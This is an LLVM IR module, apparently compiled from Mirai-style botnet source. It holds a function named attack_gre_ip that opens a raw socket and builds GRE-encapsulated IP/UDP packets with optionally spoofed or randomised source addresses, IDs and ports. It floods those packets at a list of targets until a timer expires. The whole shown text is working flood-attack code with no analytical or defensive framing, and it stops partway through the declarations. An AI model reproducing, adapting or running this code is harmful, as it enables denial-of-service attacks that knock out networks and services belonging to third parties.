; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.table_value = type { i8*, i16 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }

@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table_key = dso_local global i32 322420947, align 4
@table = dso_local global [43 x %struct.table_value] zeroinitializer, align 16
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_gre_ip(i32 noundef %0, i8 noundef zeroext %1, %struct.attack_target* noundef %2, i8 noundef zeroext %3, %struct.attack_option* noundef %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 noundef %37, i64 noundef 8) #4
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 noundef zeroext %40, %struct.attack_option* noundef %41, i8 noundef zeroext 2, i32 noundef 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 noundef zeroext %44, %struct.attack_option* noundef %45, i8 noundef zeroext 3, i32 noundef 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 noundef zeroext %48, %struct.attack_option* noundef %49, i8 noundef zeroext 4, i32 noundef 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 5, i32 noundef 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 6, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 7, i32 noundef 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 noundef zeroext %67, %struct.attack_option* noundef %68, i8 noundef zeroext 1, i32 noundef 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 noundef zeroext %71, %struct.attack_option* noundef %72, i8 noundef zeroext 18, i32 noundef 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %75, %struct.attack_option* noundef %76, i8 noundef zeroext 19, i32 noundef %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* noundef null) #4
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #4
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

86:                                               ; preds = %5
  br label %451

87:                                               ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 noundef %88, i32 noundef 0, i32 noundef 3, i8* noundef %89, i32 noundef 4) #4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 noundef %93)
  br label %451

95:                                               ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

96:                                               ; preds = %246, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %249

101:                                              ; preds = %96
  %102 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #4
  %103 = load i8**, i8*** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %26, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.iphdr*
  store %struct.iphdr* %118, %struct.iphdr** %27, align 8
  %119 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i64 1
  %121 = bitcast %struct.iphdr* %120 to %struct.udphdr*
  store %struct.udphdr* %121, %struct.udphdr** %28, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %14, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i32, i32* %20, align 4
  %136 = sext i32 %135 to i64
  %137 = add i64 52, %136
  %138 = trunc i64 %137 to i16
  %139 = call zeroext i16 @htons(i16 noundef zeroext %138) #5
  %140 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %15, align 2
  %143 = call zeroext i16 @htons(i16 noundef zeroext %142) #5
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 3
  store i16 %143, i16* %145, align 4
  %146 = load i8, i8* %16, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 5
  store i8 %146, i8* %148, align 4
  %149 = load i8, i8* %17, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %155

151:                                              ; preds = %101
  %152 = call zeroext i16 @htons(i16 noundef zeroext 16384) #5
  %153 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 4
  store i16 %152, i16* %154, align 2
  br label %155

155:                                              ; preds = %151, %101
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 6
  store i8 47, i8* %157, align 1
  %158 = load i32, i32* %23, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 8
  store i32 %158, i32* %160, align 4
  %161 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 1
  %166 = load i32, i32* %165, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = call zeroext i16 @htons(i16 noundef zeroext 2048) #5
  %170 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %171 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %170, i32 0, i32 1
  store i16 %169, i16* %171, align 2
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = load i8, i8* %173, align 4
  %175 = and i8 %174, 15
  %176 = or i8 %175, 64
  store i8 %176, i8* %173, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, -16
  %181 = or i8 %180, 5
  store i8 %181, i8* %178, align 4
  %182 = load i8, i8* %14, align 1
  %183 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 1
  store i8 %182, i8* %184, align 1
  %185 = load i32, i32* %20, align 4
  %186 = sext i32 %185 to i64
  %187 = add i64 28, %186
  %188 = trunc i64 %187 to i16
  %189 = call zeroext i16 @htons(i16 noundef zeroext %188) #5
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %15, align 2
  %193 = zext i16 %192 to i32
  %194 = xor i32 %193, -1
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 noundef zeroext %195) #5
  %197 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %16, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %208

204:                                              ; preds = %155
  %205 = call zeroext i16 @htons(i16 noundef zeroext 16384) #5
  %206 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 4
  store i16 %205, i16* %207, align 2
  br label %208

208:                                              ; preds = %204, %155
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 17, i8* %210, align 1
  %211 = call i32 @rand_next()
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load i8, i8* %22, align 1
  %215 = icmp ne i8 %214, 0
  br i1 %215, label %216, label %222

216:                                              ; preds = %208
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  %219 = load i32, i32* %218, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %230

222:                                              ; preds = %208
  %223 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  %225 = load i32, i32* %224, align 4
  %226 = sub i32 %225, 1024
  %227 = xor i32 %226, -1
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 9
  store i32 %227, i32* %229, align 4
  br label %230

230:                                              ; preds = %222, %216
  %231 = load i16, i16* %18, align 2
  %232 = call zeroext i16 @htons(i16 noundef zeroext %231) #5
  %233 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %234 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %233, i32 0, i32 0
  store i16 %232, i16* %234, align 2
  %235 = load i16, i16* %19, align 2
  %236 = call zeroext i16 @htons(i16 noundef zeroext %235) #5
  %237 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 1
  store i16 %236, i16* %238, align 2
  %239 = load i32, i32* %20, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 8, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 noundef zeroext %242) #5
  %244 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  br label %246

246:                                              ; preds = %230
  %247 = load i32, i32* %11, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %11, align 4
  br label %96, !llvm.loop !6

249:                                              ; preds = %96
  br label %250

250:                                              ; preds = %450, %249
  store i32 0, i32* %11, align 4
  br label %251

251:                                              ; preds = %441, %250
  %252 = load i32, i32* %11, align 4
  %253 = load i8, i8* %7, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp slt i32 %252, %254
  br i1 %255, label %256, label %444

256:                                              ; preds = %251
  %257 = load i8**, i8*** %13, align 8
  %258 = load i32, i32* %11, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i8*, i8** %257, i64 %259
  %261 = load i8*, i8** %260, align 8
  store i8* %261, i8** %29, align 8
  %262 = load i8*, i8** %29, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %30, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.grehdr*
  store %struct.grehdr* %266, %struct.grehdr** %31, align 8
  %267 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i64 1
  %269 = bitcast %struct.grehdr* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %32, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.udphdr*
  store %struct.udphdr* %272, %struct.udphdr** %33, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i64 1
  %275 = bitcast %struct.udphdr* %274 to i8*
  store i8* %275, i8** %34, align 8
  %276 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i32 0, i32 2
  %281 = load i8, i8* %280, align 4
  %282 = zext i8 %281 to i32
  %283 = icmp slt i32 %282, 32
  br i1 %283, label %284, label %305

284:                                              ; preds = %256
  %285 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 noundef %290) #5
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 noundef %301) #5
  %303 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  br label %305

305:                                              ; preds = %284, %256
  %306 = load i32, i32* %23, align 4
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %308, label %312

308:                                              ; preds = %305
  %309 = call i32 @rand_next()
  %310 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 8
  store i32 %309, i32* %311, align 4
  br label %312

312:                                              ; preds = %308, %305
  %313 = load i16, i16* %15, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %331

316:                                              ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 3
  store i16 %319, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  %324 = load i16, i16* %323, align 4
  %325 = zext i16 %324 to i32
  %326 = sub nsw i32 %325, 1000
  %327 = xor i32 %326, -1
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  br label %331

331:                                              ; preds = %316, %312
  %332 = load i16, i16* %18, align 2
  %333 = zext i16 %332 to i32
  %334 = icmp eq i32 %333, 65535
  br i1 %334, label %335, label %341

335:                                              ; preds = %331
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 0
  store i16 %338, i16* %340, align 2
  br label %341

341:                                              ; preds = %335, %331
  %342 = load i16, i16* %19, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  br i1 %344, label %345, label %351

345:                                              ; preds = %341
  %346 = call i32 @rand_next()
  %347 = and i32 %346, 65535
  %348 = trunc i32 %347 to i16
  %349 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %350 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %349, i32 0, i32 1
  store i16 %348, i16* %350, align 2
  br label %351

351:                                              ; preds = %345, %341
  %352 = load i8, i8* %22, align 1
  %353 = icmp ne i8 %352, 0
  br i1 %353, label %358, label %354

354:                                              ; preds = %351
  %355 = call i32 @rand_next()
  %356 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i32 0, i32 9
  store i32 %355, i32* %357, align 4
  br label %364

358:                                              ; preds = %351
  %359 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i32 0, i32 9
  %361 = load i32, i32* %360, align 4
  %362 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 9
  store i32 %361, i32* %363, align 4
  br label %364

364:                                              ; preds = %358, %354
  %365 = load i8, i8* %21, align 1
  %366 = icmp ne i8 %365, 0
  br i1 %366, label %367, label %374

367:                                              ; preds = %364
  %368 = load i8*, i8** %34, align 8
  %369 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* noundef %368, i32 noundef %369)
  %370 = load i8*, i8** %34, align 8
  %371 = load i32, i32* %20, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds i8, i8* %370, i64 %372
  store i8 0, i8* %373, align 1
  br label %374

374:                                              ; preds = %367, %364
  %375 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 0, i16* %376, align 2
  %377 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %378 = bitcast %struct.iphdr* %377 to i16*
  %379 = call zeroext i16 @checksum_generic(i16* noundef %378, i32 noundef 20)
  %380 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 7
  store i16 %379, i16* %381, align 2
  %382 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 0, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %385 = bitcast %struct.iphdr* %384 to i16*
  %386 = call zeroext i16 @checksum_generic(i16* noundef %385, i32 noundef 20)
  %387 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 %386, i16* %388, align 2
  %389 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %392 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %393 = bitcast %struct.udphdr* %392 to i8*
  %394 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 2
  %396 = load i16, i16* %395, align 2
  %397 = load i32, i32* %20, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 8, %398
  %400 = trunc i64 %399 to i32
  %401 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %391, i8* noundef %393, i16 noundef zeroext %396, i32 noundef %400)
  %402 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 2
  %404 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %405 = load i32, i32* %11, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 0
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 0
  store i16 2, i16* %409, align 4
  %410 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 9
  %412 = load i32, i32* %411, align 4
  %413 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i32 0, i32 0
  %418 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %417, i32 0, i32 2
  %419 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %418, i32 0, i32 0
  store i32 %412, i32* %419, align 4
  %420 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %421 = load i32, i32* %11, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %424, i32 0, i32 1
  store i16 0, i16* %425, align 2
  %426 = load i32, i32* %12, align 4
  %427 = load i8*, i8** %29, align 8
  %428 = load i32, i32* %20, align 4
  %429 = sext i32 %428 to i64
  %430 = add i64 52, %429
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 noundef %426, i8* noundef %427, i64 noundef %430, i32 noundef 16384, %struct.sockaddr* %439, i32 noundef 16)
  br label %441

441:                                              ; preds = %374
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %251, !llvm.loop !8

444:                                              ; preds = %251
  %445 = call i64 @time(i64* noundef null) #4
  %446 = load i32, i32* %24, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

449:                                              ; preds = %444
  br label %451

450:                                              ; preds = %444
  br label %250

451:                                              ; preds = %449, %92, %86
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #1

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #1

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
